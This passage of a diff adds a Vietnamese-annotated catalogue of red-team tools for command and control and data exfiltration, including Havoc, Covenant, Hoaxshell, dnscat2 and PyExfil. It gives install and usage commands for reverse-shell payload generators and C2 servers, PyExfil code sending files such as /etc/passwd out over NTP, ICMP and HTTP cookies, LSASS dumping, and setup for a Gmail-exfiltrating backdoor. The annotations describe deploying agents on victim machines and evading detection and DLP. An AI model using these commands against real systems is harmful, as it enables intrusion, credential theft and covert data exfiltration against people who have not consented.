+./linWinPwn.sh -t <Domain_Controller_IP> -M pwd_dump [-d <AD_domain> -u <AD_user> -p <AD_password_or_hash[LM:NT]_or_kerbticket[./krb5cc_ticket]> -o <output_dir>]
+```
+**Lưu ý:** Ví dụ về cách sử dụng **script linWinPwn.sh**. `-t` chỉ định IP của **Domain Controller**. Các tùy chọn khác cho phép cung cấp thông tin xác thực domain, thư mục output, chế độ tương tác hoặc tự động, sử dụng LDAPS, hoặc chỉ chạy một module cụ thể (`-M`). Module `pwd_dump` có thể liên quan đến việc sử dụng các công cụ như **secretsdump** hoặc các phương pháp khác để **dump hash**.
+
+Full usage information [tại đây](https://github.com/lefayjey/linWinPwn#usage).
+
+![image](https://user-images.githubusercontent.com/100603074/216737032-57ceff01-2606-474d-a745-b39fb4997ea1.png)
+
+*Hình ảnh được sử dụng từ https://github.com/lefayjey/linWinPwn#demos*
+
+**Command and Control**
+====================
+
+### [🔙](#tool-list)Dự án "**Living Off Trusted Sites Project**"
+
+**C2** implants can be detected by defenders looking for unusual network traffic to uncommon domains. Additionally proxy solutions can sometimes block connections to untrusted domains.
+
+Being able to hide your **C2 traffic** via a trusted domain will help you to stay undetected and reduce the likelihood of being blocked at the proxy level by security solutions.
+
+This resource contains a list of trusted sites that can be used.
+**Lưu ý:** Tài nguyên này là một danh sách các **domain/subdomain** của các dịch vụ phổ biến (ví dụ: Google, Microsoft, Amazon) có thể được sử dụng để "ẩn mình" hoạt động C2 bằng cách khiến lưu lượng độc hại trông giống lưu lượng truy cập hợp pháp.
+
+**Cách sử dụng:**
+
+Visit [https://lots-project.com/](https://lots-project.com/)
+
+Search for `+C&C` in the search bar to view all potential domains / subdomains that can be used for **command and control** operations.
+
+Results include:
+
+- raw.githubusercontent.com
+- docs.google.com
+- *.azurewebsites.net
+- dropbox.com
+- *.amazonaws.com
+
+![image](https://user-images.githubusercontent.com/100603074/220959716-85a7f403-95af-441b-9cbf-f6c278be6652.png)
+
+*Hình ảnh được sử dụng từ https://lots-project.com/*
+
+### [🔙](#tool-list)[**Havoc**](https://github.com/HavocFramework/Havoc)
+
+**Havoc** is a modern and malleable **post-exploitation command and control framework**, created by [@C5pider](https://twitter.com/C5pider).
+
+Features include: Sleep Obfuscation, x64 return address spoofing, Indirect Syscalls for Nt* APIs
+
+**Pre-requisites:** (Ubuntu 20.04 / 22.04)
+
+```bash
+sudo apt install build-essential
+sudo add-apt-repository ppa:deadsnakes/ppa
+sudo apt update
+sudo apt install python3.10 python3.10-dev
+```
+**Lưu ý:** Các lệnh cài đặt các gói build cần thiết và Python 3.10 trên Ubuntu. Yêu cầu quyền super user.
+
+**Build + Usage:**
+
+```bash
+git clone https://github.com/HavocFramework/Havoc.git
+cd Havoc/Client
+make
+./Havoc
+```
+**Lưu ý:** Các lệnh để clone mã nguồn và build client **Havoc** (GUI). `make` biên dịch client. Sau đó chạy tệp nhị phân **Havoc**.
+
+**Pre-requisites:** (Ubuntu 20.04 / 22.04)
+
+```bash
+cd Havoc/Teamserver
+go mod download golang.org/x/sys
+go mod download github.com/ugorji/go
+```
+**Lưu ý:** Các lệnh này tải các module Go cần thiết cho teamserver. Yêu cầu Go và **Git**.
+
+**Build + Usage:**
+
+```bash
+cd Teamserver
+./Install.sh
+make
+./teamserver -h
+```
+**Lưu ý:** Chạy script cài đặt (thêm tùy chọn tùy theo hệ điều hành/mong muốn), sau đó biên dịch (`make`) teamserver và xem trợ giúp.
+
+**Run the teamserver**
+
+```bash
+sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
+```
+**Lưu ý:** Lệnh chạy teamserver của **Havoc**. Nó lắng nghe các kết nối từ agent và xử lý chúng. `-v` và `--debug` bật chế độ chi tiết để debug. Cần quyền `sudo` để lắng nghe trên các cổng dưới 1024 nếu profile cấu hình như vậy. `--profile` chỉ định tệp cấu hình (thường là định dạng **YAML/YAOTL**) chứa các chi tiết như host, cổng, kỹ thuật che giấu,...
+
+*Full install, build and run instructions on the [wiki](https://github.com/HavocFramework/Havoc/blob/main/WIKI.MD)*
+
+![image](https://user-images.githubusercontent.com/100603074/206025215-9c7093e5-b45a-4755-81e6-9e2a52a1f455.png)
+
+### [🔙](#tool-list)[**Covenant**](https://github.com/cobbr/Covenant)
+
+**Covenant** is a **.NET command and control framework**, it has a web interface that allows for multi-user collaboration.
+
+It can be used to remotely control compromised systems and perform a variety of different tasks, including executing arbitrary code, moving laterally through a network, and exfiltrating data, and more.
+
+**Install (Dotnet Core):**
+
+You can download **dotnet core** for your platform from [tại đây](https://dotnet.microsoft.com/download/dotnet-core/3.1).
+
+**Note:** *After starting **Covenant**, you must register an initial user through the web interface. Navigating to the web interface will allow you to register the initial user*
+**Lưu ý:** **Covenant** là một ứng dụng .NET Core, chạy cross-platform nhưng yêu cầu .NET Core Runtime. Nó có giao diện web để quản lý C2.
+
+```bash
+git clone --recurse-submodules https://github.com/cobbr/Covenant
+cd Covenant/Covenant
+```
+**Lưu ý:** Clone mã nguồn **Covenant** và cả các submodule của nó.
+
+**Cách sử dụng (Dotnet Core):**
+
+```bash
+~/Covenant/Covenant > dotnet run
+warn: Microsoft.EntityFrameworkCore.Model.Validation[10400]
+      Sensitive data logging is enabled. Log entries and exception messages may include sensitive application data, this mode should only be enabled during development.
+WARNING: Running Covenant non-elevated. You may not have permission to start Listeners on low-numbered ports. Consider running Covenant elevated.
+Covenant has started! Navigate to https://127.0.0.1:7443 in a browser
+```
+**Lưu ý:** Lệnh `dotnet run` biên dịch và chạy dự án Covenant. Output cho thấy nó khởi động server web trên cổng 7443. Nó cảnh báo nếu không chạy với quyền nâng cao (có thể không thể lắng nghe trên các cổng đặc quyền).
+
+**Install (Docker):**
+
+```bash
+# Build the docker image:
+git clone --recurse-submodules https://github.com/cobbr/Covenant
+cd Covenant/Covenant
+~/Covenant/Covenant > docker build -t covenant .
+```
+**Lưu ý:** Biên dịch **Covenant** vào một Docker image.
+
+**Cách sử dụng (Docker):**
+
+```bash
+# Run Covenant within the Docker container
+~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v </absolute/path/to/Covenant/Covenant/Data>:/app/Data covenant
+
+# Stop the container
+~/Covenant/Covenant > docker stop covenant
+
+# Restart Covenant interactively
+~/Covenant/Covenant > docker start covenant -ai
+```
+**Lưu ý:** Các lệnh Docker để chạy container Covenant, ánh xạ các cổng từ container ra máy host (`-p`) và mount volume để lưu trữ dữ liệu C2 bên ngoài container (`-v`). Chạy `stop` và `start` container.
+
+Full installation and startup instructions can be found on the wiki [tại đây](https://github.com/cobbr/Covenant/wiki/Installation-And-Startup).
+
+![image](https://user-images.githubusercontent.com/100603074/210168138-58473fc0-4361-41ec-9439-2f2fcb159520.png)
+
+*Image from https://github.com/cobbr/Covenant*
+
+### [🔙](#tool-list)[**Merlin**](https://github.com/Ne0nd0g/merlin)
+
+**Merlin** is an open-source **post-exploitation framework** that is designed to be used after a initial compromise of a system.
+
+It is written in **Python** and can be used to perform a variety of different tasks, such as executing arbitrary code, moving laterally through a network, and exfiltrating data.
+**Lưu ý:** Có vẻ thông tin mô tả này chưa được cập nhật, Merlin là framework **Golang** chứ không phải Python như miêu tả cũ này. Thông tin ở phần sau (yêu cầu Go) xác nhận điều này.
+
+**Install:**
+
+1. Download the latest compiled version of **Merlin Server** from the [releases](https://github.com/Ne0nd0g/merlin/releases) section
+2. Extract the files with 7zip using the x function The password is: merlin
+3. Start Merlin
+4. Configure a [listener](https://merlin-c2.readthedocs.io/en/latest/server/menu/listeners.html)
+5. Deploy an agent. See [Agent Execution Quick Start Guide](https://merlin-c2.readthedocs.io/en/latest/quickStart/agent.html) for examples
+
+```bash
+mkdir /opt/merlin;cd /opt/merlin
+wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
+7z x merlinServer-Linux-x64.7z
+sudo ./merlinServer-Linux-x64
+```
+**Lưu ý:** Tải xuống và giải nén tệp **Merlin Server** đã được biên dịch sẵn cho Linux x64, sau đó chạy nó. Thường cần quyền `sudo` để chạy server nếu nó sử dụng cổng đặc quyền.
+
+**Cách sử dụng:**
+
+1. Ensure the **Merlin server** is running with a configured listener
+2. Download and deploy an agent to the victim
+3. Execute agent
+**Lưu ý:** Sau khi server chạy, bạn tạo các listener, generate agent binary (sử dụng server), đưa agent lên máy nạn nhân và thực thi. Agent kết nối ngược về server để nhận lệnh.
+
+For detailed usage information see the official Merlin [wiki](https://merlin-c2.readthedocs.io/en/latest/server/menu/main.html).
+
+![image](https://user-images.githubusercontent.com/100603074/210168329-57c77e4f-213c-4402-8dd8-70ac3bcabcfe.png)
+
+*Image from https://www.foregenix.com/blog/a-first-look-at-todays-command-and-control-frameworks*
+
+### [🔙](#tool-list)[**Metasploit Framework**](https://github.com/rapid7/metasploit-framework)
+
+**Metasploit** is an open-source framework for developing, testing, and using exploit code.
+
+The **Metasploit framework** includes a large number of pre-built exploits and payloads, as well as a fully-featured integrated development environment (**IDE**) for creating and testing custom exploits.
+
+**Install (Installer):**
+
+```bash
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+  chmod 755 msfinstall && \
+  ./msfinstall
+```
+**Lưu ý:** Tải xuống **script cài đặt Metasploit** chính thức bằng `curl`, cấp quyền thực thi, và chạy nó. Phương pháp cài đặt được đề xuất trên các hệ thống **Linux**.
+
+**Cách sử dụng:**
+
+```bash
+/opt/metasploit-framework/bin/msfconsole
+```
+**Lưu ý:** Lệnh chạy **console** chính của **Metasploit**, nơi bạn tương tác với framework. Thường được tìm thấy trong thư mục `/opt/metasploit-framework`.
+
+Full installation instructions can be found on the official [wiki](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html).
+
+[Rapid7 **Metasploit** blogs](https://www.rapid7.com/blog/tag/metasploit/)
+
+[Cheat sheet graphic](https://cdn.comparitech.com/wp-content/uploads/2019/06/Metasploit-Cheat-Sheet.webp)
+
+[Nice command list](https://github.com/security-cheatsheet/metasploit-cheat-sheet)
+
+![image](https://user-images.githubusercontent.com/100603074/210168463-f1ac1edb-2f0e-4008-a8ba-308f3a741a9e.png)
+
+*Image used from https://goacademy.io/how-to-install-metasploit-on-kali-linux/*
+
+### [🔙](#tool-list)[**Pupy**](https://github.com/n1nj4sec/pupy)
+
+**Pupy** is an opensource, cross-platform (**Windows, Linux, OSX, Android**) **C2** and **post-exploitation framework** written in python and C.
+
+It allows an attacker to remotely control a victim's computer and execute various actions, such as command execution, key logging, and taking screen shots.
+
+**Install (Git):**
+
+```bash
+sudo apt install git libssl1.0-dev libffi-dev python-dev python-pip build-essential swig tcpdump python-virtualenv
+git clone --recursive https://github.com/n1nj4sec/pupy
+cd pupy
+python create-workspace.py -DG pupyw
+```
+**Lưu ý:** Cài đặt các dependency (bao gồm cả thư viện Python, công cụ build, tcpdump...) và sau đó clone mã nguồn của **Pupy** (bao gồm cả submodule). Cuối cùng chạy script để tạo không gian làm việc cho Pupy. Cần quyền `sudo` để cài đặt các gói hệ thống.
+
+Roll fix to fix the error:
+
+```bash
+sudo pip2 install rpyc==3.4.4
+```
+**Lưu ý:** Lệnh sửa lỗi dependency cụ thể này cài đặt một phiên bản `rpyc` cho **Python 2**. Có vẻ như phần hướng dẫn cài đặt gốc có thể hơi lỗi thời hoặc dựa trên môi trường cụ thể. Pupy có thể cần Python 2 cho một số phần.
+
+Start:
+
+```bash
+export PATH=$PATH:~/.local/bin; pupysh
+pupyws/bin/pupysh
+```
+**Lưu ý:** Các lệnh khởi động **console Pupy** (`pupysh`) sau khi đã cấu hình không gian làm việc.
+
+*Git install instructions used from [tại đây](https://kalitut.com/how-to-install-pupy/).*
+
+**Install (Docker):**
+
+For detailed docker and **pupy** installation instructions see the [wiki](https://github.com/n1nj4sec/pupy/wiki/Installation).
+
+**Cách sử dụng:**
+
+```bash
+# Get help page for any builtin commands with -h
+>> sessions -h
+>> jobs -h
+>> run -h
+
+# Interact with session 1
+>> sessions -i 1
+
+# Run local command 'ls'
+>> !ls
+```
+**Lưu ý:** Các lệnh được sử dụng trong **console Pupy** (được biểu thị bằng `>>`). Bạn có thể dùng `-h` cho bất kỳ lệnh nào để xem trợ giúp, tương tác với các phiên (`sessions -i 1`), hoặc chạy lệnh cục bộ trên máy attacker bằng cách thêm `!` phía trước (`!ls`).
+
+Full usage information can be found on the [wiki](https://github.com/n1nj4sec/pupy/wiki/Basic-Usage).
+
+The wiki contains good [post exploitation information](https://github.com/n1nj4sec/pupy/wiki/Post-Exploitation).
+
+![image](https://user-images.githubusercontent.com/100603074/210181480-d1ad1bd8-fa8d-4014-842c-3efbb35b2644.png)
+
+*Image used from https://github.com/n1nj4sec/pupy/wiki/Screenshots*
+
+### [🔙](#tool-list)[**Brute Ratel**](https://bruteratel.com/)
+
+**BruteRatel** is a great **command and control (C4)** framework created by [@NinjaParanoid](https://twitter.com/NinjaParanoid). The framework consists of a client component 'badger' that is installed on the compromised system, and a server component 'commander' that is run by the **red team**.
+
+The client and server communicate with each other using various communication channels, such as HTTP, DNS, or TCP, and can be configured to use different encoding and encryption methods to evade detection.
+
+Some nice features:
+
+- DNS Over HTTPS
+- Indirect Syscalls
+- Built-in Debugger To Detect **EDR Userland Hooks**
+- MITRE graph integration
+- Adversary **TTP automation**
+
+**Install:**
+
+To legally get access to the framework you will need to buy a licence (1 Year $2500 per user). See the [pricing page](https://bruteratel.com/pricing/) for more information.
+**Lưu ý:** **Brute Ratel** là một **framework C2 thương mại**, không miễn phí hoặc mã nguồn mở.
+
+After purchase you can download the framework from [tại đây](https://bruteratel.com/tabs/download/) with your Activation Key and License User ID.
+
+**Cách sử dụng:**
+
+```bash
+# Loads a powershell script to memory which can be Invoked using psreflect
+psimport
+
+# Locks keyboard and mouse hardware input. Use ‘unlock_input’ command to unlock
+lock_input
+
+# Dumps user clipboard
+dumpclip
+
+# Enumerates basic domain information
+dcenum
+
+# Elevates user privileges to SYSTEM (Requires admin rights)
+get_system
+
+# Takes a screenshot of current desktop and stores it on the server
+screenshot
+
+# Dumps LSASS to C:\Windows\Memory.DMP using the PssCaptureSnapshot technique
+shadowclone
+```
+**Lưu ý:** Các lệnh ví dụ được sử dụng *bên trong console Brute Ratel*. Mỗi lệnh thực hiện một tác vụ hậu khai thác khác nhau thông qua agent (`badger`) chạy trên máy nạn nhân. Đây chỉ là một phần nhỏ các lệnh có sẵn.
+
+Full commander terminal usage information can be found [tại đây](https://bruteratel.com/tabs/badger/badgers/).
+
+![image](https://user-images.githubusercontent.com/100603074/210181655-74201cad-a782-43ed-97d3-f4c0926d46c3.png)
+
+*Image used from https://bruteratel.com/*
+
+### [🔙](#tool-list)[**NimPlant**](https://github.com/chvancooten/NimPlant)
+
+A light-weight **first-stage C2 implant** written in **Nim**.
+
+Features:
+
+- Lightweight and configurable implant written in the **Nim programming language**
+- Encryption and compression of all traffic by default, obfuscates static strings in implant artefacts
+- Support for several implant types, including native binaries (**exe/dll**), **shellcode** or self-deleting executables
+- Easy deployment of more advanced functionality or **payloads** via `inline-execute`, `shinject` (using dynamic invocation), or in-thread `execute-assembly`
+- Comprehensive logging of all interactions and file operations
+
+**Install:**
+
+```bash
+curl https://nim-lang.org/choosenim/init.sh -sSf | sh
+choosenim stable
+git clone https://github.com/chvancooten/NimPlant
+cd client
+nimble install -d
+pip3 install -r server/requirements.txt
+apt install mingw-w64
+```
+**Lưu ý:** Các lệnh cài đặt ngôn ngữ lập trình **Nim** (**choosenim** là trình quản lý phiên bản Nim), clone mã nguồn **NimPlant**, cài đặt dependency Nim (`nimble`), cài đặt dependency **Python** cho server (`pip3`) và cài đặt **mingw-w64** để cross-compile binary **Windows** trên **Linux**. Đây là quá trình cài đặt teamserver/builder của **NimPlant** trên máy attacker.
+
+**Cách sử dụng:**
+
+```bash
+# Generate payloads
+python .\NimPlant.py compile all
+
+# Start server
+python .\NimPlant.py server
+```
+**Lưu ý:** Sử dụng **script Python NimPlant.py**. Lệnh `compile all` tạo các implant/payload khác nhau. Lệnh `server` khởi động teamserver. Bạn cần cấu hình kết nối giữa implant và teamserver, cũng như các chi tiết C2 khác.
+
+Before running make sure to create the `config.tool` configuration file, more information can be found [tại đây](https://github.com/chvancooten/NimPlant#getting-started).
+**Lưu ý:** Việc cấu hình rất quan trọng trước khi chạy **NimPlant**.
+
+Full usage information can be found [tại đây](https://github.com/chvancooten/NimPlant#usage).
+
+[Blog - Building a C2 Implant in Nim - Considerations and Lessons Learned](https://casvancooten.com/posts/2021/08/building-a-c2-implant-in-nim-considerations-and-lessons-learned/)
+
+![image](https://user-images.githubusercontent.com/100603074/220959859-d930b110-c774-4b4c-b004-e4a85a6214ba.png)
+
+*Image used from https://casvancooten.com*
+
+### [🔙](#tool-list)[**Hoaxshell**](https://github.com/t3l3machus/hoaxshell)
+
+A **Windows reverse shell payload** generator and handler that abuses the http(s) protocol to establish a **beacon-like reverse shell**.
+**Lưu ý:** **Hoaxshell** tạo một **reverse shell** hoạt động giống **beacon** (kết nối định kỳ về attacker) qua HTTP/S. Nó tránh sử dụng các kênh liên lạc shell trực tiếp thường bị giám sát chặt chẽ hơn.
+
+**Install:**
+
+```bash
+git clone https://github.com/t3l3machus/hoaxshell
+cd ./hoaxshell
+sudo pip3 install -r requirements.txt
+chmod +x hoaxshell.py
+```
+**Lưu ý:** Tải mã nguồn, cài dependency Python và cấp quyền thực thi cho **script Python**. Chạy trên hệ thống **Linux** (máy attacker).
+
+**Cách sử dụng:**
+
+```bash
+# Payload that utilizes Invoke-Expression (default)
+sudo python3 hoaxshell.py -s <your_ip>
+
+# Payload that writes and executes commands from a file
+sudo python3 hoaxshell.py -s <your_ip> -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"
+
+# Encrypted shell session with a trusted certificate
+sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>
+```
+**Lưu ý:** Chạy **script Python hoaxshell.py** trên máy attacker. `-s` là địa chỉ IP hoặc domain của attacker mà shell sẽ kết nối về. `-x` chỉ định một đường dẫn file trên máy nạn nhân để ghi lệnh vào trước khi thực thi (kỹ thuật "drop and run"). `-t` bật **TLS/HTTPS** và cần chỉ định file certificate (`-c`) và private key (`-k`). Output của **Hoaxshell** là payload **PowerShell** cần chạy trên máy **Windows** nạn nhân.
+
+Full usage documentation [tại đây](https://github.com/t3l3machus/hoaxshell#usage).
+
+[Usage Demo - YouTube](https://www.youtube.com/watch?v=SEufgD5UxdU)
+
+[**Hoaxshell** vs AV](https://github.com/t3l3machus/hoaxshell#av-bypass-pocs)
+
+![image](https://user-images.githubusercontent.com/100603074/229649767-817d838c-891d-4a33-b494-9249f3a2f404.png)
+
+*Image used from https://github.com/t3l3machus/hoaxshell*
+
+**Exfiltration**
+====================
+
+### [🔙](#tool-list)[**Dnscat2**](https://github.com/iagox86/dnscat2)
+
+A tool for establishing **C2 connections** via DNS, even if the attacker and victim machines are behind a firewall / network address translation (**NAT**).
+
+The tool is designed to be stealthy and difficult to detect, as it uses legitimate **DNS traffic** to transmit data.
+
+**Install (Compile - Server):**
+
+```bash
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+gem install bundler
+bundle install
+```
+**Lưu ý:** Cài đặt **Dnscat2 Server**. Clone mã nguồn (công cụ được viết bằng **Ruby**), di chuyển vào thư mục server và cài đặt các gem **Ruby** cần thiết bằng **bundler**. Yêu cầu môi trường **Ruby** và **Bundler**. Chạy trên máy attacker.
+
+**Install (Compile - Client):**
+
+```bash
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/client/
+make
+```
+**Lưu ý:** Biên dịch client **Dnscat2**. Client được viết bằng **C**.
+
+Full installation information can be found in the [Installation Section](https://github.com/iagox86/dnscat2#compiling).
+
+**Cách sử dụng (Server):**
+
+```bash
+# Establish the server
+ruby ./dnscat2.rb DOMAIN.COM
+```
+**Lưu ý:** Chạy **Dnscat2 Server** với tên miền sẽ được sử dụng cho **DNS tunneling** (`DOMAIN.COM`). Cần cấu hình bản ghi NS của `DOMAIN.COM` để trỏ đến IP của **Dnscat2 Server** hoặc dùng tùy chọn `--no-canary` nếu không có tên miền tùy chỉnh.
+
+**Cách sử dụng (Client):**
+
+```bash
+# Establish the client with authoritative domain
+./dnscat2 DOMAIN.COM
+
+# Establish the client without authoritative domain
+./dnscat2 --dns host=0.0.0.0,port=0000
+
+# Ping the server from the client
+./dnscat --ping DOMAIN.COM
+
+# Ping the server from the client, with custom dns resolver ip
+./dnscat --dns server=0.0.0.0,domain=DOMAIN.COM --ping
+```
+**Lưu ý:** Chạy client **Dnscat2** trên máy nạn nhân. Nó sẽ cố gắng kết nối đến server thông qua các truy vấn **DNS** qua **resolver** mặc định hoặc tùy chỉnh. Kỹ thuật **DNS tunneling** ẩn dữ liệu trong các bản ghi DNS.
+
+**Cách sử dụng (Tunnels):**
+
+```bash
+# (After establishing the client) You can open a new tunnelled port
+listen [lhost:]lport rhost:rport
+
+# Forward ssh connections through the dnscat2 client to an internal device
+listen 127.0.0.1:2222 10.10.10.10:22
+```
+**Lưu ý:** Các lệnh này được sử dụng bên trong phiên shell **Dnscat2**. Nó cho phép thiết lập các tunnel TCP hoặc UDP qua **kênh C2 DNS**. Lệnh `listen` thiết lập một listener cục bộ trên máy attacker và chuyển tiếp lưu lượng qua tunnel đến địa chỉ IP và cổng bên trong mạng nạn nhân.
+
+Full usage information can be found in the [Usage Section](https://github.com/iagox86/dnscat2#usage).
+
+![image](https://user-images.githubusercontent.com/100603074/210116521-0ef905ec-cc14-4cdc-9831-46bbded8c6af.png)
+
+### [🔙](#tool-list)[**Cloakify**](https://github.com/TryCatchHCF/Cloakify)
+
+When **exfiltrating victim files**, DLP (Data Loss Prevention) solutions will typically trigger on strings within these files. **Cloakify** reduces this risk by transforming the data.
+
+**Cloakify** transforms any filetype (e.g. **.zip, .exe, .xls**, etc.) into a list of harmless-looking strings. This lets you hide the file in plain sight, and transfer the file without triggering alerts.
+
+**Note:** You can make your own ciphers, see [tại đây](https://github.com/TryCatchHCF/Cloakify#create-your-own-cipers) for more info.
+
+**Install:**
+
+```bash
+git clone https://github.com/TryCatchHCF/Cloakify
+```
+**Lưu ý:** Tải mã nguồn bằng **Git**.
+
+**Cách sử dụng:**
+
+```bash
+# Cloakify some text
+python3 cloakify.py TEXT.txt ciphers/desserts.ciph > TEXT.cloaked
+
+# De-Cloakify the text
+python3 decloakify.py TEXT.cloaked ciphers/desserts.ciph
+```
+**Lưu ý:** Các ví dụ sử dụng **script Python cloakify.py** và **decloakify.py**. Bạn cung cấp file input (`TEXT.txt`), một file "cipher" (`ciphers/desserts.ciph` chứa danh sách các chuỗi sẽ dùng để mã hóa dữ liệu) và công cụ sẽ output ra file chứa dữ liệu đã bị **cloakified** (`TEXT.cloaked`). Để giải mã, bạn sử dụng **decloakify.py** với file **cloakified** và file cipher tương ứng. File cipher chứa một danh sách các chuỗi "vô hại" như tên món tráng miệng, tên bài hát, dòng thơ,...
+
+![image](https://user-images.githubusercontent.com/100603074/210117067-4611a42a-2ac7-44af-8aee-2e448c05909b.png)
+
+![image](https://user-images.githubusercontent.com/100603074/210116996-8ec36a12-8eef-44e9-924a-ad179e599910.png)
+
+### [🔙](#tool-list)[**PyExfil**](https://github.com/ytisf/PyExfil)
+
+"An Alpha-Alpha stage package, not yet tested (and will appreciate any feedbacks and commits) designed to show several techniques of data exfiltration is real-world scenarios."
+**Lưu ý:** Đây là một **package Python** thể hiện nhiều kỹ thuật **data exfiltration** khác nhau. Tự nhận là đang ở giai đoạn phát triển ban đầu (Alpha-Alpha stage).
+
+**Install:**
+
+```bash
+git clone https://www.github.com/ytisf/PyExfil;cd PyExfil;pip install -r requirements.txt;pip install py2exe;pip setup.py install
+```
+**Lưu ý:** Tải mã nguồn, cài đặt các thư viện Python cần thiết và sử dụng **`setup.py install`** để cài đặt package. **`pip install py2exe`** có thể dùng để tạo file thực thi cho Windows.
+
+**Cách sử dụng:** (Full Usage [tại đây](https://github.com/ytisf/PyExfil/blob/master/USAGE.md))
+
+#### HTTP Cookies
+
+```python
+from pyexfil.network.HTTP_Cookies.http_exfiltration import send_file, listen
+
+# For Client (exfil)
+send_file(addr='http://www.morirt.com', file_path=FILE_TO_EXFIL)
+
+# For Server (collecting)
+listen(local_addr='127.0.0.1', local_port=80)
+```
+**Lưu ý:** Ví dụ sử dụng **PyExfil** để **exfiltrate** dữ liệu bằng cách nhúng chúng vào **cookie HTTP**. Bạn cần chạy **listener** trên máy attacker và sử dụng **send_file** trên máy nạn nhân.
+
+#### ICMP Echo 8
+
+```python
+from pyexfil.network.ICMP.icmp_exfiltration import send_file, init_listener
+
+# For Client (exfil)
+ip_addr = "127.0.0.1"
+send_file(ip_addr, src_ip_addr="127.0.0.1", file_path="", max_packetsize=512, SLEEP=0.1)
+
+# For Server (collecting)
+init_listener(ip_addr, saving_location="/tmp/")
+```
+**Lưu ý:** Ví dụ sử dụng **PyExfil** để **exfiltrate** dữ liệu bằng cách nhúng chúng vào gói tin **ICMP Echo** (gói tin **ping**). Yêu cầu quyền raw socket hoặc quyền admin trên máy gửi và nhận để tạo/lắng nghe gói ICMP.
+
+#### NTP Request
+
+```python
+from pyexfil.network.NTP.ntp_exfil import exfiltrate, ntp_listen, NTP_UDP_PORT
+
+# For Client (exfil)
+ip_addr = "127.0.0.1"
+exfiltrate("/etc/passwd", ip_addr, time_delay=0.1)
+
+# For Server (collecting)
+ntp_listener(ip="0.0.0.0", port=NTP_UDP_PORT)
+```
+**Lưu ý:** Ví dụ sử dụng **PyExfil** để **exfiltrate** dữ liệu bằng cách nhúng chúng vào gói tin **NTP** (Network Time Protocol).
+
+![image](https://user-images.githubusercontent.com/100603074/206573575-e90384c4-4a39-4f3c-96ec-face1f191808.png)
+
+### [🔙](#tool-list)[**Powershell RAT**](https://github.com/Viralmaniar/Powershell-RAT)
+
+**Python based backdoor** that uses **Gmail** to **exfiltrate** data as an e-mail attachment. It tracks the user activity using screen capture and sends the information to an attacker as an e-mail attachment.
+**Lưu ý:** **Powershell RAT** thực tế bao gồm cả mã nguồn **Python** (server hoặc điều khiển) và mã nguồn **PowerShell** (backdoor/agent chạy trên máy nạn nhân). Nó sử dụng Gmail làm kênh **exfiltration** bằng cách gửi email đính kèm dữ liệu thu thập được.
+
+**Install:**
+
+```bash
+git clone https://github.com/Viralmaniar/Powershell-RAT
+```
+**Lưu ý:** Tải mã nguồn bằng **Git**.
+
+**Cách sử dụng:** (Full Usage [tại đây](https://github.com/Viralmaniar/Powershell-RAT/blob/master/README.md))
+
+#### Setup
+
+- Throwaway Gmail address
+- Enable "**Allow less secure apps**" by going to https://myaccount.google.com/lesssecureapps
+- Modify the `$username` & `$password` variables for your account in the Mail.ps1 Powershell file
+- Modify `$msg.From` & `$msg.To.Add` with throwaway gmail address
+**Lưu ý:** Để backdoor **PowerShell** này hoạt động, bạn cần thiết lập một tài khoản Gmail và cấu hình backdoor với thông tin đăng nhập (tên người dùng và mật khẩu) của tài khoản Gmail đó để nó có thể gửi email. "Allow less secure apps" cần bật để backdoor có thể đăng nhập vào Gmail bằng mật khẩu đơn thuần thay vì OAuth/MFA. *Cẩn thận khi sử dụng tài khoản Gmail cho mục đích này.*
+
+![image](https://user-images.githubusercontent.com/100603074/210267906-68a2e852-d7b5-4b61-a747-77844e1d7d99.png)
+
+### [🔙](#tool-list)[**GD-Thief**](https://github.com/antman1p/GD-Thief)
+
+Tool for **exfiltrating** files from a target's **Google Drive** that you have access to, via Google's API.
+
+This includes all shared files, all files from shared drives, and all files from domain drives that the target has access to.
+**Lưu ý:** Công cụ này tập trung vào việc thu thập dữ liệu từ **Google Drive**, lợi dụng quyền truy cập tài khoản Google đã bị xâm nhập hoặc quyền truy cập ứng dụng đối với tài khoản đó.
+
+**Install:**
+
+```bash
+git clone https://github.com/antman1p/GD-Thief.git
+cd GD-Thief
+pip install --upgrade google-api-python-client google-auth-httplib2 google-auth-oauthlib
+```
+**Lưu ý:** Tải mã nguồn và cài đặt các thư viện **Python** cho việc tương tác với Google API.
+
+then...
+
+1. Create a new Google Cloud Platform (GCP) project
+2. Enable a **Google Workspace API**
+3. Configure **OAuth Consent** screen
+4. Create a credential
+5. Add the victim's Google account to the Application's Test Users
+
+For detailed setup instructions see the [How To Guide](https://github.com/antman1p/GD-Thief#how-to).
+**Lưu ý:** Các bước thiết lập bên ngoài, cấu hình một dự án Google Cloud Platform và OAuth 2.0 để công cụ có thể được ủy quyền truy cập dữ liệu Google Drive. Quá trình này phức tạp và yêu cầu quyền truy cập vào cả tài khoản GCP của attacker và (ban đầu) sự đồng ý hoặc quyền của nạn nhân.
+
+**Cách sử dụng:**
+
+```bash
+usage:
+python3 gd_thief.py [-h] -m [{dlAll, dlDict[-d <DICTIONARY FILE PATH>]}
+	[-t <THREAD COUNT>]
+
+help:
+
+This Module will connect to Google's API using an access token and exfiltrate files
+from a target's **Google Drive**. It will output exfiltrated files to the ./loot directory
+
+arguments:
+        -m [{dlAll, dlDict}],
+                --mode [{dlAll, dlDict}]
+                Chế độ tải xuống file
+                Có thể là "dlAll", "dlDict [-d <DICTIONARY FILE PATH>]", hoặc... (Thêm tùy chọn sẽ đến)
+
+optional arguments:
+        -d <DICTIONARY FILE PATH>, --dict <DICTIONARY FILE PATH>
+                        Đường dẫn đến file dictionary. Bắt buộc với chế độ tải xuống "-m, --mode dlDict"
+                        Bạn có thể sử dụng dictionary được cung cấp, ví dụ: "-d ./dictionaries/secrets-keywords.txt"
+        -t <THREAD COUNT>, --threads <THREAD COUNT>
+                        Số luồng. (Quá nhiều có thể vượt quá giới hạn tốc độ của Google)
+
